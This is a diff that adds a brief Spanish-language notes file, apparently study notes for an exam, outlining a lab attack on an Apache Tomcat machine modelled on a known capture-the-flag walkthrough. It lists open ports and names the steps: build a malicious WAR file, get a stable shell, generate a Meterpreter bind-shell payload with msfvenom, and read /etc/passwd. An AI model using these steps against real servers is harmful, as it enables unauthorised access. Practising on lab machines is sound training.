@@ -1,0 +1,18 @@
+Parcial 
+puertos: 22 514 8009 8080
+
+ippsec-Jerry
+
+
+
+desde nat
+
+crear un war vulnerable(comando que se ejecute una maquina)
+hacer una shell estable
+msfvenom -p linux/meterpreter/bind_Tcp -f elf(exe de linux)
+
+cat/etc/passwd
+
+ssh <>@
+
+desde el tomcat, 
